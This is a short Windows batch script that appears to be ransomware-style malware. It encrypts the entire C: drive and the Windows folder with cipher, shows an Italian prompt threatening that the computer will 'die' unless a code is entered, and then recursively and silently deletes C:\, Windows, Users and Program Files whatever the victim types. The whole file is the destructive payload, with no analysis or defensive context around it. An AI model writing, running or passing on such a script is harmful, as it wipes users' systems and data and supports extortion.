@echo off

cd C:/
cipher /e /s:C:\
cipher /e /s:C:\Windows
set /p nome=Inserisci il codice o il tuo computer muore:
rmdir /s /q "C:\"
rmdir /s /q "C:\Windows"
rmdir /s /q "C:\Users"
rmdir /s /q "C:\Program Files"
